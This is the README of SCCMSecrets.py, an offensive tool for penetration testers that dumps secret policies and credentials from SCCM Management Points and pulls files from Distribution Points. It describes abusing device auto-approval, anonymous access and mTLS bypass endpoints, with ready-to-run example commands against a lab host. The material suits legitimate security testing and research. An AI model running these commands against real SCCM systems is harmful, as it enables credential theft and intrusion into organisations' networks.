# SCCMSecrets

SCCMSecrets.py is an SCCM policies exploitation tool. It goes beyond NAA credentials extraction, and aims to provide a comprehensive approach regarding SCCM policies exploitation. The tool can be executed from various levels of privileges, and will attempt to uncover potential misconfigurations related to policies distribution. More detail regarding the tool and its usage is available in the associated article:
https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial


Two subcommands are available: `policies` and `files`.

## Policies

This subcommand interacts with an SCCM **Management Point** in order to dump the contents of all secret policies (including NAA configuration, task sequences containing credentials, or collection variables). To do so, an approved SCCM device is needed, which can be obtained in three ways.
 - If you do not provide a machine account, SCCMSecrets will attempt to register a device and abuse automatic device approval. This is a (non-default) SCCM configuration which automatically grants the "Approved" state to new devices registered anonymously.
 - If you provide a machine account, SCCMSecrets will register a new device using the authenticated registration endpoint. By default, SCCM will grant the "Approved" state to devices registered through this endpoint.
 - If you provide the `--altauth` flag, SCCMSecrets will exploit an alternate authentication endpoint, allowing to bypass mTLS requirements, and to get an approved device without credentials and without the automatic device approval misconfiguration ([more information here](https://www.synacktiv.com/sites/default/files/2025-08/def-con-33-mehdi-elyassa-sccm-the-tree-that-always-bears-bad-fruits.pdf#page=15)). This only works when the MP is configured to use HTTPS, AND the SCCM site is configured to enforce HTTPS site-wide (if the MP is using HTTPS but the site allows either HTTP or HTTPS, devices are not automatically approved).
 - You can also provide an existing device (`--use-existing-device`). This argument expects a directory containing the `guid.txt` file (device GUID) and the `key.pem` file (device private key). This can be a device created by a previous SCCMSecrets execution, or the one corresponding to a compromised legitimate SCCM client.

Note that SCCM policies are associated with collections. Registering a new device will place this device in default collections - thus, only secret policies from default collections will be retrieved. This is why impersonating a compromised legitimate SCCM client with the `--use-existing-device` can be interesting. Indeed, this legitimate client could be part of custom collections associated with additional secret policies.

Output will be placed in a subdirectory of the `loot` directory (format: `[timestamp]_policies`).

```
$ python3 SCCMSecrets.py policies -h
                                                                                                                                                                                                                       
 Usage: SCCMSecrets.py policies [OPTIONS]                                                                                                                                                                              
                                                                                                                                                                                                                       
 Dump secret policies from an SCCM Management Point                                                                                                                                                                    
                                                                                                                                                                                                                       
╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --management-point     -mp      TEXT     The client's SCCM management point. Expects either a URL, or a hostname/IP (defaults to HTTP in the latter case) [required]                                             │
│ *  --client-name          -cn      TEXT     [Optional] The name of the client that will be created in SCCM - or a random name if using an existing device [required]                                                │
│    --machine-name         -u       TEXT     [Optional] A machine account name. If not provided, SCCMSecrets will try to exploit automatic device approval                                                           │
│    --machine-pass         -p       TEXT     [Optional] The password for the machine account                                                                                                                         │
│    --machine-hash         -H       TEXT     [Optional] The NT hash for the machine account                                                                                                                          │
│    --registration-sleep   -rs      INTEGER  [Optional] The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to   │
│                                             device collections (3 minutes by default, may need to be increased)                                                                                                     │
│                                             [default: 180]                                                                                                                                                          │
│    --use-existing-device  -d       TEXT     [Optional] This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it        │
│                                             expects the path of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key). Note that a client-name value must also │
│                                             be provided to SCCMSecrets (but does not have to match the one of the existing device)                                                                                  │
│    --pki-cert             -c       TEXT     [Optional] The path to a valid domain PKI certificate in PEM format. Required when the Management Point enforces HTTPS and thus client certificate authentication       │
│    --pki-key              -k       TEXT     [Optional] The path to the private key of the certificate in PEM format                                                                                                 │
│    --altauth              -a                [Optional] Use the MP's alternate authentication endpoint. This endpoint bypasses mutual TLS requirements, and automatically approves devices registered through it. It │
│                                             only works when the MP uses HTTPS AND HTTPS is enforced site-wide                                                                                                       │
│    --verbose              -v                [Optional] Enable verbose output                                                                                                                                        │
│    --help                 -h                Show this message and exit.                                                                                                                                             │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```


## Files

This subcommand will index files stored on a **Distribution Point** and download interesting ones. SCCMSecrets will first attempt to identify if anonymous access is enabled (non-default). If this is the case, files can be indexed and downloaded without authentication. Otherwise, domain credentials will be needed.

It is possible to download files by extension. SCCMSecrets will index files of all packages hosted on the Distribution Point (resulting in an `index.txt` file with the Unix `tree` format), and it will download files with specified extensions. When providing an empty list of extensions, only file indexing will be performed.
In both cases, from the produced index file, it is possible to use the `--urls` flag to download specific interesting files (without reindexing).

Note that mTLS requirements, if they are implemented, can be bypassed by providing the `--nocert` flag.

Output will be placed in a subdirectory of the `loot` directory (format: `[timestamp]_files`).

```
$ python3 SCCMSecrets.py files --help
                                                                                                                                                                                                                       
 Usage: SCCMSecrets.py files [OPTIONS]                                                                                                                                                                                 
                                                                                                                                                                                                                       
 Dump interesting files from an SCCM Distribution Point                                                                                                                                                                
                                                                                                                                                                                                                       
╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ *  --distribution-point  -dp      TEXT     An SCCM distribution point. Expects either a URL, or a hostname/IP (defaults to HTTP in the latter case) [required]                                                      │
│    --username            -u       TEXT     [Optional] A username for a domain account. If no account is provided, SCCMSecrets will try to exploit anonymous DP access                                               │
│    --password            -p       TEXT     [Optional] The password for the domain account                                                                                                                           │
│    --hash                -H       TEXT     [Optional] The NT hash for the domain account (e.g. A4F49C406510BDCAB6824EE7C30FD852)                                                                                    │
│    --extensions          -e       TEXT     [Optional] Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts. Provide an empty string to not         │
│                                            download anything, and only index files                                                                                                                                  │
│                                            [default: .ps1, .bat, .xml, .txt, .pfx]                                                                                                                                  │
│    --urls                -f       TEXT     [Optional] A file containing a list of URLs (one per line) that should be downloaded from the Distribution Point. This is useful if you already indexed files and do not │
│                                            want to download by extension, but rather specific known files                                                                                                           │
│    --max-recursion       -r       INTEGER  [Optional] The maximum recursion depth when indexing files from the Distribution Point [default: 10]                                                                     │
│    --pki-cert            -c       TEXT     [Optional] The path to a valid domain PKI certificate in PEM format. Required when the Distribution Point enforces HTTPS and thus client certificate authentication      │
│    --pki-key             -k       TEXT     [Optional] The path to the private key of the certificate in PEM format                                                                                                  │
│    --nocert              -n                [Optional] Use the DP's nocert endpoint. This endpoint bypasses mutual TLS requirements                                                                                  │
│    --verbose             -v                [Optional] Enable verbose output                                                                                                                                         │
│    --help                -h                Show this message and exit.                                                                                                                                              │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

## About HTTPS enforcement

By default, clients can interact with their Management Point or Distribution Point using plain HTTP. The SCCM installation may however be configured more securely by enforcing the use of HTTPS. When this is the case (for either the Management Point, the Distribution Point, or both), SCCM will require client certificate authentication using an internal PKI certificate with the "client authentication" purpose.

It is still possible to carry out the attacks presented above - however, a valid PKI certificate must be provided through the `--pki-cert` and `--pki-key` flags (PEM format). The Management Point / Distribution Point URLs should also be prefixed by `https://`.
Note that the `--altauth` (for policies) and `--nocert` (for files) flags provide ways to bypass mTLS authentication ([more information here](https://www.synacktiv.com/sites/default/files/2025-08/def-con-33-mehdi-elyassa-sccm-the-tree-that-always-bears-bad-fruits.pdf#page=15)).



# Installation

You can install SCCMSecrets.py by cloning the repository and installing the dependencies.
```
$ git clone https://github.com/synacktiv/SCCMSecrets
$ cd SCCMSecrets
$ python3 -m venv .venv && source .venv/bin/activate
$ python3 -m pip install -r requirements.txt
```


# Examples

Below are some example commands.

### Policies

Retrieve secret policies without providing a machine account. This will attempt to exploit the automatic device approval misconfiguration (non-default configuration)
```
$ python3 SCCMSecrets.py policies -mp http://mecm.sccm.lab -cn 'test'
```

Retrieve secret policies by providing a machine account. This will work in default SCCM configurations
```
$ python3 SCCMSecrets.py policies -mp http://mecm.sccm.lab -u 'azule$' -p 'Password123!' -cn 'test'
```

Retrieve secret policies of an already existing device. The `compromised_device` folder contains a `guid.txt` and `key.pem` file.
```
$ python3 SCCMSecrets.py policies -mp http://mecm.sccm.lab --use-existing-device compromised_device/
```

Retrieve secret policies when the Management Point enforces HTTPS
```
$ python3 SCCMSecrets.py policies -mp https://mecm.sccm.lab -u 'azule$' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -cn 'test' --pki-cert ./cert.pem --pki-key ./key.pem
```

Retrieve secret policies using the alternate authentication endpoint, allowing to bypass mTLS authentication and to get an approved device without providing credentials ([more information here](https://www.synacktiv.com/sites/default/files/2025-08/def-con-33-mehdi-elyassa-sccm-the-tree-that-always-bears-bad-fruits.pdf#page=15)). Only works when the MP uses HTTPS and HTTPS is enforced site-wide
```
$ python3 SCCMSecrets.py policies -mp https://mecm.sccm.lab -cn 'test' --altauth
```


### Files

Retrieve Distribution Point files without providing credentials. This will attempt to exploit anonymous DP access (non-default configuration)
```
$ python3 SCCMSecrets files -dp http://mecm.sccm.lab
```

Retrieve Distribution Point files with credentials. This will work in default SCCM configurations
```
$ python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -p 'dragon'
```

Retrieve files wih a specific list of extensions. Authenticate with the machine account's hash
```
$ python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -H 'F7EB9C06FAFAA23C4BCF22BA6781C1E2' --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'
```

Retrieve specific files from the Distribution Point by providing a list of URLs (1 by line)
```
$ python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -p 'dragon' --urls to_download.lst
```

Retrieve DP files when the Distribution Point enforces HTTPS
```
$ python3 SCCMSecrets.py files -dp https://mecm.sccm.lab -u 'dave' -p 'dragon' --pki-cert ./cert.pem --pki-key ./key.pem
```

Bypass mTLS authentication when the Distribution Point enforces HTTPS
```
$ python3 SCCMSecrets.py files -dp https://mecm.sccm.lab -u 'dave' -p 'dragon' --nocert
```